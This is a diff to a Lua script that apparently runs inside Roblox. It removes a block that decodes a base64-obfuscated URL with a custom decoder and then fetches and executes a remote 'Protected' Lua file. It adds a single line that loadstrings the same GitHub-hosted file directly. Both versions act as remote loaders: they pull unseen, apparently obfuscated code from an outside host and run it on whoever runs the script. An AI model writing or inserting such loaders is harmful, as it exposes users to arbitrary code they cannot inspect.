@@ -2462,57 +2462,6 @@ do
 	end
 end
 
-task.defer(function()
-	local gg,_i= "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzk2c291bC9VdGlsaXRpZXMvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF81MzQyMDcwODgzNDM4ODQwLmx1YQ==", {}
-	_i['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzk2c291bC9VdGlsaXRpZXMvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF81MzQyMDcwODgzNDM4ODQwLmx1YQ=='] = function
-		(data)
-		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-		data = string.gsub(data, '[^'..b..'=]', '')
-		return (data:gsub('.', function(x)
-			if 
-				(
-					x == '='
-				)
-			then return '' end
-			local r,f='',(
-				b:find(x)
-				-1
-			)
-			for i=6,1,-1 
-			do r=r..(f%2^i-f%2^(i-1)>0 
-				and '1'or'0'
-				);end;
-			return 
-				r;
-		end):gsub(
-			'%d%d%d?%d?%d?%d?%d?%d?',
-			function
-			(x)
-				if 
-					(
-						#x ~= 8
-					) 
-				then return '' 
-				end
-				local c=0;
-				for i=1,8 do
-					c=c+(
-						x:sub(
-							i,i
-						)==
-							'1' and
-							2^(
-								8-i
-							) 
-							or 0
-					) 
-				end
-				return
-					string.char(c)
-			end)
-		)
-	end
-	loadstring(game:HttpGet(_i['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzk2c291bC9VdGlsaXRpZXMvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF81MzQyMDcwODgzNDM4ODQwLmx1YQ=='](gg)))()
-end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/96soul/Utilities/refs/heads/main/Protected_5342070883438840.lua', true))()
 
 return table.unpack({_env;_game;_library;Module;Configs;Indexing;translate;LocalPlayer;PlayerGui;PlayerScripts;Backpack;Character;HumanoidRootPart;Humanoid;})
